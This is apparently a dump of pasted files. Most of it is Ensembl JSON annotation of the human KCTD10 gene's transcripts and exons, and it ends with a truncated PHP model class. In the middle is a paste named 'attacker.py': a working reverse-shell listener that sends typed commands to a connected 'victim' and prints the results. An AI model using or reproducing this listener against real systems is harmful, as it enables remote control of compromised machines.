                            ""end"": 109477300
                        },
                        {
                            ""version"": 1,
                            ""db_type"": ""core"",
                            ""start"": 109469515,
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00002231630"",
                            ""seq_region_name"": ""12"",
                            ""end"": 109471377,
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""object_type"": ""Exon""
                        },
                        {
                            ""seq_region_name"": ""12"",
                            ""end"": 109460805,
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""object_type"": ""Exon"",
                            ""start"": 109460636,
                            ""db_type"": ""core"",
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003684740"",
                            ""version"": 1
                        },
                        {
                            ""version"": 1,
                            ""seq_region_name"": ""12"",
                            ""end"": 109458081,
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""object_type"": ""Exon"",
                            ""db_type"": ""core"",
                            ""start"": 109457992,
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00002310387""
                        },
                        {
                            ""version"": 1,
                            ""db_type"": ""core"",
                            ""start"": 109457630,
                            ""id"": ""ENSE00003664767"",
                            ""assembly_name"": ""GRCh38"",
                            ""end"": 109457682,
                            ""seq_region_name"": ""12"",
                            ""object_type"": ""Exon"",
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1
                        },
                        {
                            ""version"": 1,
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""object_type"": ""Exon"",
                            ""end"": 109456313,
                            ""seq_region_name"": ""12"",
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003478591"",
                            ""start"": 109456118,
                            ""db_type"": ""core""
                        },
                        {
                            ""version"": 1,
                            ""start"": 109451287,
                            ""db_type"": ""core"",
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00002301093"",
                            ""seq_region_name"": ""12"",
                            ""end"": 109451813,
                            ""object_type"": ""Exon"",
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1
                        }
                    ],
                    ""is_canonical"": 0,
                    ""source"": ""havana"",
                    ""id"": ""ENST00000537165"",
                    ""start"": 109451287,
                    ""db_type"": ""core"",
                    ""species"": ""homo_sapiens"",
                    ""Parent"": ""ENSG00000110906"",
                    ""end"": 109477300
                },
                {
                    ""db_type"": ""core"",
                    ""start"": 109451404,
                    ""is_canonical"": 0,
                    ""id"": ""ENST00000538161"",
                    ""source"": ""havana"",
                    ""Parent"": ""ENSG00000110906"",
                    ""end"": 109464895,
                    ""species"": ""homo_sapiens"",
                    ""biotype"": ""protein_coding_CDS_not_defined"",
                    ""Exon"": [
                        {
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""object_type"": ""Exon"",
                            ""end"": 109464895,
                            ""seq_region_name"": ""12"",
                            ""id"": ""ENSE00002249533"",
                            ""assembly_name"": ""GRCh38"",
                            ""start"": 109464782,
                            ""db_type"": ""core"",
                            ""version"": 1
                        },
                        {
                            ""start"": 109460636,
                            ""db_type"": ""core"",
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003684740"",
                            ""seq_region_name"": ""12"",
                            ""end"": 109460805,
                            ""object_type"": ""Exon"",
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""version"": 1
                        },
                        {
                            ""id"": ""ENSE00003667684"",
                            ""assembly_name"": ""GRCh38"",
                            ""start"": 109457992,
                            ""db_type"": ""core"",
                            ""object_type"": ""Exon"",
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""seq_region_name"": ""12"",
                            ""end"": 109458078,
                            ""version"": 1
                        },
                        {
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003664767"",
                            ""db_type"": ""core"",
                            ""start"": 109457630,
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""object_type"": ""Exon"",
                            ""seq_region_name"": ""12"",
                            ""end"": 109457682,
                            ""version"": 1
                        },
                        {
                            ""version"": 1,
                            ""object_type"": ""Exon"",
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""end"": 109456313,
                            ""seq_region_name"": ""12"",
                            ""id"": ""ENSE00003478591"",
                            ""assembly_name"": ""GRCh38"",
                            ""db_type"": ""core"",
                            ""start"": 109456118
                        },
                        {
                            ""seq_region_name"": ""12"",
                            ""end"": 109451813,
                            ""object_type"": ""Exon"",
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""db_type"": ""core"",
                            ""start"": 109451404,
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00002322219"",
                            ""version"": 1
                        }
                    ],
                    ""assembly_name"": ""GRCh38"",
                    ""seq_region_name"": ""12"",
                    ""logic_name"": ""havana_homo_sapiens"",
                    ""strand"": -1,
                    ""MANE"": [],
                    ""object_type"": ""Transcript"",
                    ""display_name"": ""KCTD10-206"",
                    ""version"": 5
                },
                {
                    ""object_type"": ""Transcript"",
                    ""MANE"": [],
                    ""strand"": -1,
                    ""logic_name"": ""havana_homo_sapiens"",
                    ""seq_region_name"": ""12"",
                    ""assembly_name"": ""GRCh38"",
                    ""version"": 5,
                    ""display_name"": ""KCTD10-211"",
                    ""species"": ""homo_sapiens"",
                    ""Parent"": ""ENSG00000110906"",
                    ""end"": 109469724,
                    ""id"": ""ENST00000540411"",
                    ""is_canonical"": 0,
                    ""source"": ""havana"",
                    ""start"": 109451595,
                    ""db_type"": ""core"",
                    ""Exon"": [
                        {
                            ""object_type"": ""Exon"",
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""seq_region_name"": ""12"",
                            ""end"": 109469724,
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00002295875"",
                            ""start"": 109469515,
                            ""db_type"": ""core"",
                            ""version"": 1
                        },
                        {
                            ""end"": 109460805,
                            ""seq_region_name"": ""12"",
                            ""object_type"": ""Exon"",
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""start"": 109460636,
                            ""db_type"": ""core"",
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003651575"",
                            ""version"": 1
                        },
                        {
                            ""version"": 1,
                            ""id"": ""ENSE00003475433"",
                            ""assembly_name"": ""GRCh38"",
                            ""db_type"": ""core"",
                            ""start"": 109457992,
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""object_type"": ""Exon"",
                            ""end"": 109458078,
                            ""seq_region_name"": ""12""
                        },
                        {
                            ""version"": 1,
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""object_type"": ""Exon"",
                            ""end"": 109457682,
                            ""seq_region_name"": ""12"",
                            ""id"": ""ENSE00003462325"",
                            ""assembly_name"": ""GRCh38"",
                            ""start"": 109457630,
                            ""db_type"": ""core""
                        },
                        {
                            ""id"": ""ENSE00001724937"",
                            ""assembly_name"": ""GRCh38"",
                            ""db_type"": ""core"",
                            ""start"": 109456118,
                            ""object_type"": ""Exon"",
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""seq_region_name"": ""12"",
                            ""end"": 109456244,
                            ""version"": 1
                        },
                        {
                            ""db_type"": ""core"",
                            ""start"": 109451595,
                            ""id"": ""ENSE00002258038"",
                            ""assembly_name"": ""GRCh38"",
                            ""end"": 109451813,
                            ""seq_region_name"": ""12"",
                            ""object_type"": ""Exon"",
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""version"": 1
                        }
                    ],
                    ""Translation"": {
                        ""length"": 287,
                        ""version"": 1,
                        ""id"": ""ENSP00000441672"",
                        ""db_type"": ""core"",
                        ""start"": 109451595,
                        ""species"": ""homo_sapiens"",
                        ""object_type"": ""Translation"",
                        ""Parent"": ""ENST00000540411"",
                        ""end"": 109469722
                    },
                    ""biotype"": ""protein_coding""
                },
                {
                    ""display_name"": ""KCTD10-215"",
                    ""version"": 5,
                    ""assembly_name"": ""GRCh38"",
                    ""MANE"": [],
                    ""object_type"": ""Transcript"",
                    ""strand"": -1,
                    ""logic_name"": ""havana_homo_sapiens"",
                    ""seq_region_name"": ""12"",
                    ""Translation"": {
                        ""id"": ""ENSP00000439481"",
                        ""start"": 109451630,
                        ""db_type"": ""core"",
                        ""species"": ""homo_sapiens"",
                        ""object_type"": ""Translation"",
                        ""end"": 109456297,
                        ""Parent"": ""ENST00000542954"",
                        ""length"": 121,
                        ""version"": 1
                    },
                    ""biotype"": ""protein_coding"",
                    ""Exon"": [
                        {
                            ""object_type"": ""Exon"",
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""seq_region_name"": ""12"",
                            ""end"": 109460395,
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00002299112"",
                            ""db_type"": ""core"",
                            ""start"": 109460348,
                            ""version"": 1
                        },
                        {
                            ""id"": ""ENSE00003667684"",
                            ""assembly_name"": ""GRCh38"",
                            ""start"": 109457992,
                            ""db_type"": ""core"",
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""object_type"": ""Exon"",
                            ""end"": 109458078,
                            ""seq_region_name"": ""12"",
                            ""version"": 1
                        },
                        {
                            ""start"": 109457630,
                            ""db_type"": ""core"",
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003664767"",
                            ""seq_region_name"": ""12"",
                            ""end"": 109457682,
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""object_type"": ""Exon"",
                            ""version"": 1
                        },
                        {
                            ""version"": 1,
                            ""end"": 109456313,
                            ""seq_region_name"": ""12"",
                            ""object_type"": ""Exon"",
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""start"": 109456118,
                            ""db_type"": ""core"",
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003459435""
                        },
                        {
                            ""end"": 109451813,
                            ""seq_region_name"": ""12"",
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""object_type"": ""Exon"",
                            ""db_type"": ""core"",
                            ""start"": 109451630,
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00002241511"",
                            ""version"": 1
                        }
                    ],
                    ""is_canonical"": 0,
                    ""source"": ""havana"",
                    ""id"": ""ENST00000542954"",
                    ""db_type"": ""core"",
                    ""start"": 109451630,
                    ""species"": ""homo_sapiens"",
                    ""Parent"": ""ENSG00000110906"",
                    ""end"": 109460395
                },
                {
                    ""Translation"": {
                        ""length"": 120,
                        ""version"": 1,
                        ""id"": ""ENSP00000441586"",
                        ""db_type"": ""core"",
                        ""start"": 109451634,
                        ""object_type"": ""Translation"",
                        ""species"": ""homo_sapiens"",
                        ""end"": 109456297,
                        ""Parent"": ""ENST00000535546""
                    },
                    ""biotype"": ""protein_coding"",
                    ""Exon"": [
                        {
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""object_type"": ""Exon"",
                            ""end"": 109458982,
                            ""seq_region_name"": ""12"",
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00002204564"",
                            ""db_type"": ""core"",
                            ""start"": 109458925,
                            ""version"": 1
                        },
                        {
                            ""version"": 1,
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003667684"",
                            ""db_type"": ""core"",
                            ""start"": 109457992,
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""object_type"": ""Exon"",
                            ""end"": 109458078,
                            ""seq_region_name"": ""12""
                        },
                        {
                            ""version"": 1,
                            ""object_type"": ""Exon"",
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""seq_region_name"": ""12"",
                            ""end"": 109457682,
                            ""id"": ""ENSE00003664767"",
                            ""assembly_name"": ""GRCh38"",
                            ""db_type"": ""core"",
                            ""start"": 109457630
                        },
                        {
                            ""seq_region_name"": ""12"",
                            ""end"": 109456313,
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""object_type"": ""Exon"",
                            ""start"": 109456118,
                            ""db_type"": ""core"",
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003459435"",
                            ""version"": 1
                        },
                        {
                            ""version"": 1,
                            ""id"": ""ENSE00002290060"",
                            ""assembly_name"": ""GRCh38"",
                            ""db_type"": ""core"",
                            ""start"": 109451634,
                            ""object_type"": ""Exon"",
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""end"": 109451813,
                            ""seq_region_name"": ""12""
                        }
                    ],
                    ""source"": ""havana"",
                    ""is_canonical"": 0,
                    ""id"": ""ENST00000535546"",
                    ""start"": 109451634,
                    ""db_type"": ""core"",
                    ""species"": ""homo_sapiens"",
                    ""Parent"": ""ENSG00000110906"",
                    ""end"": 109458982,
                    ""version"": 5,
                    ""display_name"": ""KCTD10-203"",
                    ""assembly_name"": ""GRCh38"",
                    ""strand"": -1,
                    ""object_type"": ""Transcript"",
                    ""MANE"": [],
                    ""seq_region_name"": ""12"",
                    ""logic_name"": ""havana_homo_sapiens""
                },
                {
                    ""display_name"": ""KCTD10-210"",
                    ""version"": 1,
                    ""assembly_name"": ""GRCh38"",
                    ""strand"": -1,
                    ""MANE"": [],
                    ""object_type"": ""Transcript"",
                    ""logic_name"": ""havana_homo_sapiens"",
                    ""seq_region_name"": ""12"",
                    ""biotype"": ""retained_intron"",
                    ""Exon"": [
                        {
                            ""seq_region_name"": ""12"",
                            ""end"": 109457975,
                            ""object_type"": ""Exon"",
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""db_type"": ""core"",
                            ""start"": 109457630,
                            ""id"": ""ENSE00002270013"",
                            ""assembly_name"": ""GRCh38"",
                            ""version"": 1
                        },
                        {
                            ""start"": 109456118,
                            ""db_type"": ""core"",
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003478591"",
                            ""end"": 109456313,
                            ""seq_region_name"": ""12"",
                            ""object_type"": ""Exon"",
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""version"": 1
                        },
                        {
                            ""version"": 1,
                            ""start"": 109451641,
                            ""db_type"": ""core"",
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00002320356"",
                            ""seq_region_name"": ""12"",
                            ""end"": 109451813,
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""object_type"": ""Exon""
                        }
                    ],
                    ""is_canonical"": 0,
                    ""source"": ""havana"",
                    ""id"": ""ENST00000540402"",
                    ""start"": 109451641,
                    ""db_type"": ""core"",
                    ""species"": ""homo_sapiens"",
                    ""Parent"": ""ENSG00000110906"",
                    ""end"": 109457975
                },
                {
                    ""Translation"": {
                        ""Parent"": ""ENST00000540355"",
                        ""end"": 109456297,
                        ""object_type"": ""Translation"",
                        ""species"": ""homo_sapiens"",
                        ""db_type"": ""core"",
                        ""start"": 109451682,
                        ""id"": ""ENSP00000440008"",
                        ""version"": 1,
                        ""length"": 104
                    },
                    ""biotype"": ""protein_coding"",
                    ""Exon"": [
                        {
                            ""seq_region_name"": ""12"",
                            ""end"": 109458871,
                            ""object_type"": ""Exon"",
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""start"": 109458849,
                            ""db_type"": ""core"",
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00002211318"",
                            ""version"": 1
                        },
                        {
                            ""object_type"": ""Exon"",
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""seq_region_name"": ""12"",
                            ""end"": 109458078,
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003667684"",
                            ""db_type"": ""core"",
                            ""start"": 109457992,
                            ""version"": 1
                        },
                        {
                            ""start"": 109457630,
                            ""db_type"": ""core"",
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003664767"",
                            ""seq_region_name"": ""12"",
                            ""end"": 109457682,
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""object_type"": ""Exon"",
                            ""version"": 1
                        },
                        {
                            ""version"": 1,
                            ""db_type"": ""core"",
                            ""start"": 109456118,
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003459435"",
                            ""end"": 109456313,
                            ""seq_region_name"": ""12"",
                            ""object_type"": ""Exon"",
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1
                        },
                        {
                            ""start"": 109451682,
                            ""db_type"": ""core"",
                            ""id"": ""ENSE00002227701"",
                            ""assembly_name"": ""GRCh38"",
                            ""seq_region_name"": ""12"",
                            ""end"": 109451813,
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""object_type"": ""Exon"",
                            ""version"": 1
                        }
                    ],
                    ""is_canonical"": 0,
                    ""id"": ""ENST00000540355"",
                    ""source"": ""havana"",
                    ""start"": 109451682,
                    ""db_type"": ""core"",
                    ""species"": ""homo_sapiens"",
                    ""Parent"": ""ENSG00000110906"",
                    ""end"": 109458871,
                    ""display_name"": ""KCTD10-209"",
                    ""version"": 5,
                    ""assembly_name"": ""GRCh38"",
                    ""object_type"": ""Transcript"",
                    ""MANE"": [],
                    ""strand"": -1,
                    ""seq_region_name"": ""12"",
                    ""logic_name"": ""havana_homo_sapiens""
                },
                {
                    ""Parent"": ""ENSG00000110906"",
                    ""end"": 109477289,
                    ""species"": ""homo_sapiens"",
                    ""db_type"": ""core"",
                    ""start"": 109456222,
                    ""is_canonical"": 0,
                    ""source"": ""havana"",
                    ""id"": ""ENST00000541077"",
                    ""Exon"": [
                        {
                            ""db_type"": ""core"",
                            ""start"": 109477260,
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00002308528"",
                            ""end"": 109477289,
                            ""seq_region_name"": ""12"",
                            ""object_type"": ""Exon"",
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""version"": 1
                        },
                        {
                            ""seq_region_name"": ""12"",
                            ""end"": 109460805,
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""object_type"": ""Exon"",
                            ""db_type"": ""core"",
                            ""start"": 109460636,
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003543934"",
                            ""version"": 1
                        },
                        {
                            ""version"": 1,
                            ""object_type"": ""Exon"",
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""end"": 109458184,
                            ""seq_region_name"": ""12"",
                            ""id"": ""ENSE00002257937"",
                            ""assembly_name"": ""GRCh38"",
                            ""start"": 109457992,
                            ""db_type"": ""core""
                        },
                        {
                            ""db_type"": ""core"",
                            ""start"": 109457630,
                            ""id"": ""ENSE00003664767"",
                            ""assembly_name"": ""GRCh38"",
                            ""end"": 109457682,
                            ""seq_region_name"": ""12"",
                            ""object_type"": ""Exon"",
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""version"": 1
                        },
                        {
                            ""version"": 1,
                            ""id"": ""ENSE00002282031"",
                            ""assembly_name"": ""GRCh38"",
                            ""db_type"": ""core"",
                            ""start"": 109456222,
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""object_type"": ""Exon"",
                            ""seq_region_name"": ""12"",
                            ""end"": 109456313
                        }
                    ],
                    ""biotype"": ""nonsense_mediated_decay"",
                    ""Translation"": {
                        ""version"": 1,
                        ""length"": 37,
                        ""Parent"": ""ENST00000541077"",
                        ""end"": 109477262,
                        ""species"": ""homo_sapiens"",
                        ""object_type"": ""Translation"",
                        ""db_type"": ""core"",
                        ""start"": 109460695,
                        ""id"": ""ENSP00000474870""
                    },
                    ""seq_region_name"": ""12"",
                    ""logic_name"": ""havana_homo_sapiens"",
                    ""object_type"": ""Transcript"",
                    ""MANE"": [],
                    ""strand"": -1,
                    ""assembly_name"": ""GRCh38"",
                    ""display_name"": ""KCTD10-212"",
                    ""version"": 1
                },
                {
                    ""Translation"": {
                        ""id"": ""ENSP00000437348"",
                        ""db_type"": ""core"",
                        ""start"": 109456243,
                        ""species"": ""homo_sapiens"",
                        ""object_type"": ""Translation"",
                        ""Parent"": ""ENST00000542262"",
                        ""end"": 109477262,
                        ""length"": 170,
                        ""version"": 1
                    },
                    ""biotype"": ""protein_coding"",
                    ""Exon"": [
                        {
                            ""db_type"": ""core"",
                            ""start"": 109477260,
                            ""id"": ""ENSE00002308997"",
                            ""assembly_name"": ""GRCh38"",
                            ""seq_region_name"": ""12"",
                            ""end"": 109477305,
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""object_type"": ""Exon"",
                            ""version"": 1
                        },
                        {
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003462237"",
                            ""start"": 109469515,
                            ""db_type"": ""core"",
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""object_type"": ""Exon"",
                            ""end"": 109469728,
                            ""seq_region_name"": ""12"",
                            ""version"": 1
                        },
                        {
                            ""version"": 1,
                            ""id"": ""ENSE00003651575"",
                            ""assembly_name"": ""GRCh38"",
                            ""start"": 109460636,
                            ""db_type"": ""core"",
                            ""object_type"": ""Exon"",
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""seq_region_name"": ""12"",
                            ""end"": 109460805
                        },
                        {
                            ""version"": 1,
                            ""seq_region_name"": ""12"",
                            ""end"": 109457682,
                            ""object_type"": ""Exon"",
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""start"": 109457630,
                            ""db_type"": ""core"",
                            ""id"": ""ENSE00003462325"",
                            ""assembly_name"": ""GRCh38""
                        },
                        {
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""object_type"": ""Exon"",
                            ""seq_region_name"": ""12"",
                            ""end"": 109456313,
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00002322928"",
                            ""start"": 109456243,
                            ""db_type"": ""core"",
                            ""version"": 1
                        }
                    ],
                    ""is_canonical"": 0,
                    ""id"": ""ENST00000542262"",
                    ""source"": ""havana"",
                    ""db_type"": ""core"",
                    ""start"": 109456243,
                    ""species"": ""homo_sapiens"",
                    ""Parent"": ""ENSG00000110906"",
                    ""end"": 109477305,
                    ""display_name"": ""KCTD10-213"",
                    ""version"": 5,
                    ""assembly_name"": ""GRCh38"",
                    ""MANE"": [],
                    ""object_type"": ""Transcript"",
                    ""strand"": -1,
                    ""seq_region_name"": ""12"",
                    ""logic_name"": ""havana_homo_sapiens""
                },
                {
                    ""Parent"": ""ENSG00000110906"",
                    ""end"": 109477300,
                    ""species"": ""homo_sapiens"",
                    ""db_type"": ""core"",
                    ""start"": 109456285,
                    ""is_canonical"": 0,
                    ""id"": ""ENST00000542858"",
                    ""source"": ""havana"",
                    ""Exon"": [
                        {
                            ""version"": 1,
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003680955"",
                            ""start"": 109477260,
                            ""db_type"": ""core"",
                            ""object_type"": ""Exon"",
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""seq_region_name"": ""12"",
                            ""end"": 109477300
                        },
                        {
                            ""seq_region_name"": ""12"",
                            ""end"": 109469728,
                            ""object_type"": ""Exon"",
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""db_type"": ""core"",
                            ""start"": 109469515,
                            ""id"": ""ENSE00003462237"",
                            ""assembly_name"": ""GRCh38"",
                            ""version"": 1
                        },
                        {
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003651575"",
                            ""db_type"": ""core"",
                            ""start"": 109460636,
                            ""object_type"": ""Exon"",
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""seq_region_name"": ""12"",
                            ""end"": 109460805,
                            ""version"": 1
                        },
                        {
                            ""version"": 1,
                            ""db_type"": ""core"",
                            ""start"": 109457992,
                            ""id"": ""ENSE00002297725"",
                            ""assembly_name"": ""GRCh38"",
                            ""seq_region_name"": ""12"",
                            ""end"": 109458048,
                            ""object_type"": ""Exon"",
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1
                        },
                        {
                            ""version"": 1,
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003462325"",
                            ""db_type"": ""core"",
                            ""start"": 109457630,
                            ""object_type"": ""Exon"",
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""end"": 109457682,
                            ""seq_region_name"": ""12""
                        },
                        {
                            ""version"": 1,
                            ""object_type"": ""Exon"",
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""end"": 109456313,
                            ""seq_region_name"": ""12"",
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00002318671"",
                            ""db_type"": ""core"",
                            ""start"": 109456285
                        }
                    ],
                    ""biotype"": ""protein_coding"",
                    ""Translation"": {
                        ""version"": 1,
                        ""length"": 175,
                        ""end"": 109477262,
                        ""Parent"": ""ENST00000542858"",
                        ""object_type"": ""Translation"",
                        ""species"": ""homo_sapiens"",
                        ""start"": 109456285,
                        ""db_type"": ""core"",
                        ""id"": ""ENSP00000445129""
                    },
                    ""logic_name"": ""havana_homo_sapiens"",
                    ""seq_region_name"": ""12"",
                    ""MANE"": [],
                    ""object_type"": ""Transcript"",
                    ""strand"": -1,
                    ""assembly_name"": ""GRCh38"",
                    ""version"": 1,
                    ""display_name"": ""KCTD10-214""
                },
                {
                    ""display_name"": ""KCTD10-204"",
                    ""version"": 5,
                    ""assembly_name"": ""GRCh38"",
                    ""seq_region_name"": ""12"",
                    ""logic_name"": ""havana_homo_sapiens"",
                    ""strand"": -1,
                    ""object_type"": ""Transcript"",
                    ""MANE"": [],
                    ""biotype"": ""retained_intron"",
                    ""Exon"": [
                        {
                            ""db_type"": ""core"",
                            ""start"": 109477260,
                            ""id"": ""ENSE00003681876"",
                            ""assembly_name"": ""GRCh38"",
                            ""seq_region_name"": ""12"",
                            ""end"": 109477300,
                            ""object_type"": ""Exon"",
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""version"": 1
                        },
                        {
                            ""seq_region_name"": ""12"",
                            ""end"": 109469728,
                            ""object_type"": ""Exon"",
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""start"": 109469515,
                            ""db_type"": ""core"",
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003681262"",
                            ""version"": 1
                        },
                        {
                            ""version"": 1,
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""object_type"": ""Exon"",
                            ""seq_region_name"": ""12"",
                            ""end"": 109460805,
                            ""id"": ""ENSE00002253444"",
                            ""assembly_name"": ""GRCh38"",
                            ""start"": 109460326,
                            ""db_type"": ""core""
                        }
                    ],
                    ""start"": 109460326,
                    ""db_type"": ""core"",
                    ""id"": ""ENST00000535747"",
                    ""is_canonical"": 0,
                    ""source"": ""havana"",
                    ""Parent"": ""ENSG00000110906"",
                    ""end"": 109477300,
                    ""species"": ""homo_sapiens""
                },
                {
                    ""assembly_name"": ""GRCh38"",
                    ""MANE"": [],
                    ""object_type"": ""Transcript"",
                    ""strand"": -1,
                    ""logic_name"": ""havana_homo_sapiens"",
                    ""seq_region_name"": ""12"",
                    ""display_name"": ""KCTD10-207"",
                    ""version"": 1,
                    ""id"": ""ENST00000538377"",
                    ""is_canonical"": 0,
                    ""source"": ""havana"",
                    ""db_type"": ""core"",
                    ""start"": 109469062,
                    ""species"": ""homo_sapiens"",
                    ""Parent"": ""ENSG00000110906"",
                    ""end"": 109477300,
                    ""biotype"": ""retained_intron"",
                    ""Exon"": [
                        {
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003681876"",
                            ""db_type"": ""core"",
                            ""start"": 109477260,
                            ""object_type"": ""Exon"",
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""seq_region_name"": ""12"",
                            ""end"": 109477300,
                            ""version"": 1
                        },
                        {
                            ""version"": 1,
                            ""id"": ""ENSE00002276789"",
                            ""assembly_name"": ""GRCh38"",
                            ""db_type"": ""core"",
                            ""start"": 109469062,
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""object_type"": ""Exon"",
                            ""seq_region_name"": ""12"",
                            ""end"": 109469728
                        }
                    ]
                }
            ],
            ""version"": 13,
            ""display_name"": ""KCTD10"",
            ""description"": ""potassium channel tetramerization domain containing 10 [Source:HGNC Symbol;Acc:HGNC:23236]"",
            ""object_type"": ""Gene"",
            ""strand"": -1,
            ""logic_name"": ""ensembl_havana_gene_homo_sapiens"",
            ""seq_region_name"": ""12"",
            ""assembly_name"": ""GRCh38"",
            ""canonical_transcript"": ""ENST00000228495.11"",
            ""biotype"": ""protein_coding"",
            ""species"": ""homo_sapiens"",
            ""end"": 109477359,
            ""source"": ""ensembl_havana"",
            ""id"": ""ENSG00000110906"",
            ""start"": 109448655,
            ""db_type"": ""core""
        }"
0xzEbZqP,attacker.py,FlyFar,Python,Saturday 19th of August 2023 08:30:59 AM CDT,"import socketserver
import logging

HOST, PORT = ""192.168.10.7"", 9999

class ServerHandler(socketserver.BaseRequestHandler):
    def setup(self):
        logging.info(""The victim has connected successfully: {}"".format(self.client_address[0]))
    
    def handle(self):
        while True:
            command = """"
            
            while not command:
                command = input("">"")

            self.request.sendall(command.encode(""utf-8""))
            data = self.request.recv(8192)

            output = str(data.strip(), ""utf-8"", ""ignore"")
            print(output)

    def finish(self):
        logging.info(""The victim got disconnected: {}"".format(self.client_address[0]))
    
logger = logging.basicConfig(
    level=logging.INFO,
    format=""(%(asctime)s) [%(levelname)s] %(message)s"",
    datefmt=""%H:%M:%S"",
)

with socketserver.TCPServer((HOST, PORT), ServerHandler) as server:
    logging.info(""Server started on {}:{}"".format(HOST, PORT))
    logging.info(""Waiting for a connection..."")
    server.serve_forever()"
sx0PjUDE,UserModel.php,lamhotsimamora,PHP,Saturday 19th of August 2023 08:28:55 AM CDT,"<?php

namespace App\Models;

use CodeIgniter\Model;

class UserModel extends Model
{
    protected $table      = 'users';
